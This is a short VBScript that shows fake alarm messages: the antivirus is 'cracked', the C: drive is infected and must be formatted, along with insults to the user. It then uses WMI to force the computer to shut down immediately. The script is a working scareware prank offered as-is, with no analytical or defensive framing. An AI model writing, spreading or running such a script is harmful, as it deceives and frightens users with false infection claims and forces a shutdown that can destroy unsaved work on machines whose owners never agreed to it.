x = Msgbox("I HAVE CRACKED YOUR ANTIVIRUS",48, "WARNING!!!")
x = Msgbox("Nice files, just let me ...",48, "WARNING!!!")
Y = Msgbox("Virus has infected the hard drive (C:).Deletion of the virus will require complete formatting of the hard drive (C:). Would you like to format hard drive ? (C:)",48, "WARNING")
z = Msgbox("STUPID!!!")
h = Msgbox("NEXT TIME",32, "USELESS")
a = Msgbox("CHECK",32, "USELESS")
b = Msgbox("WHAT ARE YOU DOWNLOADING",4+16, "USELESS")
b = Msgbox("STUPID!!!",32, "USELESS")

strComputer = "."
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate,(Shutdown)}!\\" & _
strComputer & "\root\cimv2")
Set colOperatingSystems = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
objOperatingSystem.Win32ShutDown(5)
Next
